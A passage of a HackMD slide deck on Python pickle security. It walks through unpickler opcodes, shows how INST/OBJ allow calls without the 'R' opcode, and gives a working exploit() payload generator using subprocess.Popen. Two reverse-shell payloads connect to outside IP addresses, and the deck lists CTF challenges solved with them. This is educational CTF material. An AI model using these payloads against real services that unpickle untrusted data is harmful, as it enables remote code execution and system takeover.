</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/22"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">23</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/23&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;24&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x02
Rq\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> popped.

Byte: <span class="hljs-string">b'q'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;, (<span class="hljs-string">'id'</span>,)]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-number">1</span>: <span class="hljs-string">'id'</span>}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/23"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">24</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 189px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/24&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;25&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">R
q\x03.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">REDUCE Push an <span class="hljs-built_in">object</span> built <span class="hljs-keyword">from</span> 
a <span class="hljs-built_in">callable</span> <span class="hljs-keyword">and</span> an argument <span class="hljs-built_in">tuple</span>.

Byte: <span class="hljs-string">b'R'</span>
Stack: [&lt;built-<span class="hljs-keyword">in</span> function system&gt;, (<span class="hljs-string">'id'</span>,)]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-number">1</span>: <span class="hljs-string">'id'</span>, <span class="hljs-number">2</span>: (<span class="hljs-string">'id'</span>,)}
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/24"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">25</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 290px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/25&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;26&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN"><img class="emoji" alt=":fire:" src="./Security Issues in Python Pickle - HackMD_files/fire.png" data-position="5" data-size="6"> Command got executed! <img class="emoji" alt=":fire:" src="./Security Issues in Python Pickle - HackMD_files/fire.png" data-position="34" data-size="6"></h3>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">system(<span class="hljs-string">"id"</span>)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/25"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">26</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 312px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/26&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;27&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">No... I don't like R-things.
No Rabits, Rats, Roosters or RCEs.
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/26"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">27</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/27&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;28&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x03
.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> popped.

Byte: <span class="hljs-string">b'q'</span>
Stack: [<span class="hljs-number">0</span>]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-number">1</span>: <span class="hljs-string">'id'</span>, <span class="hljs-number">2</span>: (<span class="hljs-string">'id'</span>,)}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/27"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">28</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/28&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;29&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">STOP Stop the unpickling machine.

Byte: <span class="hljs-string">b'.'</span>
Stack: [<span class="hljs-number">0</span>]
Meta Stack: []
Memo: {<span class="hljs-number">0</span>: &lt;built-<span class="hljs-keyword">in</span> function system&gt;, <span class="hljs-number">1</span>: <span class="hljs-string">'id'</span>, <span class="hljs-number">2</span>: (<span class="hljs-string">'id'</span>,), <span class="hljs-number">3</span>: <span class="hljs-number">0</span>}

</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/28"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">29</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 304px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/29&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;30&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">The value left on the top of the stack will be regard as the return value of loads</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/29"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">30</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 269px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/30&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;31&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">What if</h4>
<h4 class="raw part" data-startline="NaN" data-endline="NaN">we can make function calls without R in someway?</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/30"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">31</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 211px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/31&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;32&lt;/span&gt;&lt;/a&gt;"><div><blockquote class="part" data-startline="NaN" data-endline="NaN">
<p data-position="NaN" data-size="0"><a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L1583:L1588" target="_blank" rel="noopener">load_reduce</a><br>
<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L1494-L1499" target="_blank" rel="noopener">load_inst</a><br>
<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L1501-L1506" target="_blank" rel="noopener">load_obj</a><br>
<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L1477-L1492" target="_blank" rel="noopener">_instantiate</a></p>
</blockquote>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/31"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">32</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 73px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/32&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;33&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">_instantiate</h2>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Create a new object via <code data-position="NaN" data-size="12">klass(*args)</code></li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Leads to arbitrary function call actually</li>
</ul>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_instantiate</span>(<span class="hljs-params">self, klass, args</span>):</span>
    <span class="hljs-keyword">if</span> (args <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(klass, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span>
        <span class="hljs-built_in">hasattr</span>(klass, <span class="hljs-string">"__getinitargs__"</span>)):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Arbitrary function all</span>
            value = klass(*args)
        <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> err:
            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">"in constructor for %s: %s"</span> %
                            (klass.__name__, <span class="hljs-built_in">str</span>(err)), sys.exc_info()[<span class="hljs-number">2</span>])
    <span class="hljs-keyword">else</span>:
        value = klass.__new__(klass)
    self.append(value)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/32"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">33</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 218px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/33&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;34&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">load_obj</h2>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_obj</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># Stack is ... markobject classobject arg1 arg2 ...</span>
    args = self.pop_mark()
    cls = args.pop(<span class="hljs-number">0</span>)
    self._instantiate(cls, args)
dispatch[OBJ[<span class="hljs-number">0</span>]] = load_obj
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/33"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">34</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 284.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/34&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;35&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">OPCODE</h3>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><code data-position="NaN" data-size="1">o</code></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/34"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">35</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 177.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/35&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;36&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">load_inst</h2>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_inst</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># read from user input</span>
    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">"ascii"</span>)
    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">"ascii"</span>)
    klass = self.find_class(module, name)
    <span class="hljs-comment"># get args from stack</span>
    args = self.pop_mark()
    self._instantiate(klass, args)
dispatch[INST[<span class="hljs-number">0</span>]] = load_inst
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/35"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">36</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 284.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/36&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;37&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">OPCODE</h3>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><code data-position="NaN" data-size="1">i</code></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/36"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">37</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 314px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/37&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;38&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Exploit</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/37"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">38</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 244.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/38&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;39&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">subprocess.Popen</li>
</ul>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">((S<span class="hljs-string">'python'</span>
S<span class="hljs-string">'-c'</span>
X\x0f\x00\x00\x00print(<span class="hljs-string">'pwned!'</span>)lisubprocess
Popen
.
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/38"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">39</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 144px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/39&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;40&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> base64

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">command</span>):</span>
    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(command) <span class="hljs-keyword">is</span> <span class="hljs-built_in">list</span>
    payload_prefix = <span class="hljs-string">b'''(('''</span>
    payload_suffix = <span class="hljs-string">b'''lisubprocess\nPopen\n.'''</span>
    payload_body = <span class="hljs-built_in">bytes</span>()
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> command:
        payload_body += <span class="hljs-string">b"X"</span> + <span class="hljs-built_in">bytes</span>(struct.pack(<span class="hljs-string">"&lt;I"</span>, <span class="hljs-built_in">len</span>(c))) + <span class="hljs-built_in">bytes</span>(c, encoding=<span class="hljs-string">"utf-8"</span>)
    payload = payload_prefix + payload_body + payload_suffix
    <span class="hljs-keyword">assert</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload
    <span class="hljs-keyword">return</span> payload

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    payload = exploit([
        <span class="hljs-string">"python"</span>,
        <span class="hljs-string">"-c"</span>,
        <span class="hljs-string">"print('pwned!')"</span>
    ])
    print(<span class="hljs-string">"Payload:"</span>, payload)
    print(<span class="hljs-string">"Length:"</span>, <span class="hljs-built_in">len</span>(payload))
    print(<span class="hljs-string">"Base64:"</span>, base64.b64encode(payload))
    x = pickle.loads(payload)
    print(x)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/39"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">40</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 264px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/40&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;41&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Solve this challenge</h2>
<h2 class="raw part" data-startline="NaN" data-endline="NaN">in god mod</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/40"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">41</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 164px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/41&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;42&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Reverse Shell</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> sys,socket,os,pty
s=socket.socket()
s.connect((<span class="hljs-string">"182.92.191.192"</span>,<span class="hljs-number">50000</span>))
[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)]
pty.spawn(<span class="hljs-string">"/bin/sh"</span>)
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">payload = exploit([
    <span class="hljs-string">"python"</span>,
    <span class="hljs-string">"-c"</span>,
    <span class="hljs-string">'import sys,socket,os,pty;s=socket.socket();s.connect(("8.8.8.8", 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>,
])
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/41"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">42</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 264px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/42&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;43&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/QroZIDt.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/42"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">43</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 61.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/43&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;44&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Let’s just solve other challenges</h2>
<h2 class="raw part" data-startline="NaN" data-endline="NaN">using this single payload</h2>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a> <img class="emoji" alt=":white_check_mark:" src="./Security Issues in Python Pickle - HackMD_files/white_check_mark.png" data-position="121" data-size="18"></p>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge-Back</a> <img class="emoji" alt=":white_check_mark:" src="./Security Issues in Python Pickle - HackMD_files/white_check_mark.png" data-position="205" data-size="18"></p>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10020/" target="_blank" rel="noopener">2018-HITB-Python-Revenge</a> <img class="emoji" alt=":white_check_mark:" src="./Security Issues in Python Pickle - HackMD_files/white_check_mark.png" data-position="284" data-size="18"></p>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p data-position="NaN" data-size="0"><a href="http://web.hitctf.cn:10019/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge</a> <img class="emoji" alt=":heavy_exclamation_mark:" src="./Security Issues in Python Pickle - HackMD_files/heavy_exclamation_mark.png" data-position="365" data-size="24"></p>
</li>
</ul>
